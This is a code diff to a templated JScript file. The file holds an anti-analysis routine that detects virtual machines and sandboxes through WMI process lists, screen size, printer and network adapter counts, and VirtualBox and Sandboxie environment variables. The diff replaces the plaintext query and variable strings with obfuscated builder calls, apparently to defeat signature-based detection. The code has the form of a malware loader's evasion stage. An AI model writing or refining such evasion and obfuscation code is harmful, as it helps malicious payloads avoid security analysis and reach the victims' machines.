@@ -33,12 +33,12 @@
         try {
             var wmi  = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
             var bad  = {{ v.fn_build_str }}([{{ v.jsc_vm_procs }}]).split("|");
-            var pq   = wmi.ExecQuery("SELECT Name FROM Win32_Process");
+            var pq   = wmi.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_proc_q }}]));
             for (var e = new Enumerator(pq); !e.atEnd(); e.moveNext()) {
                 var n = e.item().Name.toLowerCase();
                 for (var i = 0; i < bad.length; i++) { if (n === bad[i]) return true; }
             }
-            var mq = wmi.ExecQuery("SELECT ScreenWidth,ScreenHeight FROM Win32_DesktopMonitor");
+            var mq = wmi.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_monitor_q }}]));
             for (var em = new Enumerator(mq); !em.atEnd(); em.moveNext()) {
                 var d = em.item();
                 if (d.ScreenWidth && d.ScreenWidth < 800) return true;
@@ -61,22 +61,22 @@
         } catch(e) {}
         try {
             var wmi2 = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
-            var prq = wmi2.ExecQuery("SELECT Name FROM Win32_Printer");
+            var prq = wmi2.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_printer_q }}]));
             var pc = 0;
             for (var ep = new Enumerator(prq); !ep.atEnd(); ep.moveNext()) pc++;
             if (pc === 0) return true;
         } catch(e) {}
         try {
             var wmi3 = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
-            var naq = wmi3.ExecQuery("SELECT MACAddress FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL");
+            var naq = wmi3.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_mac_q }}]));
             var nac = 0;
             for (var ena = new Enumerator(naq); !ena.atEnd(); ena.moveNext()) nac++;
             if (nac < 2) return true;
         } catch(e) {}
         try {
             var _env = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}])).Environment("Process");
-            if (_env("VBOX_VERSION") !== "") return true;
-            if (_env("SANDBOXIE_HOME") !== "") return true;
+            if (_env({{ v.fn_build_str }}([{{ v.jsc_env_vbox }}])) !== "") return true;
+            if (_env({{ v.fn_build_str }}([{{ v.jsc_env_sandboxie }}])) !== "") return true;
         } catch(e) {}
         return false;
     }
